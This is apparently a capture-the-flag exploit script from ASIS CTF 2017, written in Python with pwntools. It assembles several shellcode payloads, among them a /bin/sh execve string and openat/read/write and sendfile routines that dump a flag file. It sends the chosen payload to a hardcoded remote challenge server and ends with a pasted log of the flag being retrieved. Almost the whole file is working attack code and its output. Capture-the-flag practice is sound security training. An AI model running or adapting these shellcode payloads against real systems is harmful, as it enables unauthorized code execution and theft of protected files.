#!/usr/bin/env python
from pwn import *
import time

'''
sc = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" +\
     "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" +\
     "\x80\xe8\xdc\xff\xff\xff/bin/sh"

sc = "\x49\xba\x2e\x2f\x66\x6c\x61\x67\x00\x00\x41\x52\x48\x31\xc0\x48\xff\xc0\x48\x89\xc7\x48\x89\xe6\x48\x31\xd2\xb2\xff\x0f\x05" + '\xeb\xfe'

sc = open('sc').read()
'''

def getshellcode(asm, thirtytwo=False):
    with open('/tmp/asmsource', 'w') as f:
        f.write(asm)
    os.system('as %s /tmp/asmsource -o /tmp/asmelf && objcopy -Obinary /tmp/asmelf /tmp/asmraw' % ('--32' if thirtytwo else '',))
    with open('/tmp/asmraw', 'r') as f:
        return f.read()

# >>> hex(struct.unpack("<Q", "./flag\0\0")[0])
# '0x67616c662f2e'

leak_esp = lambda size: getshellcode('''
    mov $0x67616c662f2e, %r10
    #push %r10
    #xor %rax, %rax
    #mov $2, %al
    #mov %rsp, %rdi
    #xor %rsi, %rsi
    #syscall
    #.ascii "\xeb\xfe"

    xor %rax, %rax
    inc %rax
    mov %rax, %rdi
    mov %rsp, %rsi
    xor %rdx, %rdx
    mov ${size}, %dx
    syscall

    #.ascii "\xeb\xfe"
    ''' .format(size=size))

leak_elf_from_eip = lambda direction: getshellcode('''
    xor %rax, %rax
    inc %rax
    mov %rax, %rdi
    xor %rdx, %rdx
    inc %dx
    #mov %rip, %rsi
    call label0
label0:
    pop %rsi
label:
    syscall
    {dir} %rsi
    jmp label
'''.format(dir=direction))
    
open_sendfile = getshellcode('''
jmp strconstant
afterjump:
pop %ebx
xor %eax, %eax
mov $5, %al
xor %ecx, %ecx
xor %edx, %edx
.ascii "\xeb\xfe" # seems like 32-bit syscalls are blocked too
int $0x80
mov %eax, %ecx

mov $187, %al
xor %ebx, %ebx
inc %ebx
mov %eax, %esi
int $0x80
strconstant:
call afterjump
.string "./flag"
''', thirtytwo=True)

openat_sendfile = lambda size: getshellcode('''
    mov $0x67616c662f2f2f2e, %r10
    push %r10
    xor %rax, %rax
    mov $257, %ax # openat
    xor %rdi, %rdi
    mov $0xffffff9c, %edi # AT_FDCWD
    mov %rsp, %rsi
    xor %rdx, %rdx
    syscall
    #.ascii "\xeb\xfe"

    xor %rdi, %rdi
    inc %rdi
    mov %rax, %rsi
    xor %r10, %r10
    mov ${size}, %r10w
    xor %rax, %rax
    mov $40, %al # sendfile
    .ascii "\xeb\xfe"
    syscall
    ''' .format(size=size))

openat_read_write = lambda size: getshellcode('''
    xor %rax, %rax
    push %rax
    mov $0x67616c662f2f2f2e, %r10
    push %r10
    mov $257, %ax # openat
    xor %rdi, %rdi
    mov $0xffffff9c, %edi # AT_FDCWD
    mov %rsp, %rsi
    xor %rdx, %rdx
    syscall
    #.ascii "\xeb\xfe"

    mov %rax, %rdi
    xor %rax, %rax
    mov %rbp, %rsi
    mov ${size}, %dl
    xor %rax, %rax # read
    syscall
    #.ascii "\xeb\xfe"

    xor %rax, %rax
    inc %rax # write
    mov %rax, %rdi # stdout
    syscall
    #.ascii "\xeb\xfe"
    ''' .format(size=size))


    
#sc = leak_esp(0x2000)
#sc = leak_elf_from_eip('inc')
#sc = leak_elf_from_eip('dec')
#sc = openat_sendfile(0xfff)
sc = openat_read_write(0x40)

print(repr(sc))

#sys.exit(0)

p = remote('188.226.140.60', 10001)
p.sendline(sc)

#time.sleep(1)
#result = p.recvall()

'''
with open('leaked_from_eip_dec', 'w') as f:
    f.write(result)
'''
'''
s = open('leaked_from_eip_dec').read()
t = s[26:]
open('leaked_from_eip_dec_rev', 'w').write(t[::-1])
'''

p.interactive()

'''
avi@debian:~/Documents/asisctf_2017$ python exploit_defaulter.py
'H1\xc0PI\xba.///flagARf\xb8\x01\x01H1\xff\xbf\x9c\xff\xff\xffH\x89\xe6H1\xd2\x0f\x05H\x89\xc7H1\xc0H\x89\xee\xb2@H1\xc0\x0f\x05H1\xc0H\xff\xc0H\x89\xc7\x0f\x05'
[+] Opening connection to 188.226.140.60 on port 10001: Done
[*] Switching to interactive mode
The shellcode to execute: ASIS{r34d_wr1t3_sh3llc0de_w1th_0pen4t_:-P}
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb6\x9fï¿½ï¿½b\xa3[*] Got EOF while reading in interactive
$
[*] Interrupted
[*] Closed connection to 188.226.140.60 port 10001
'''
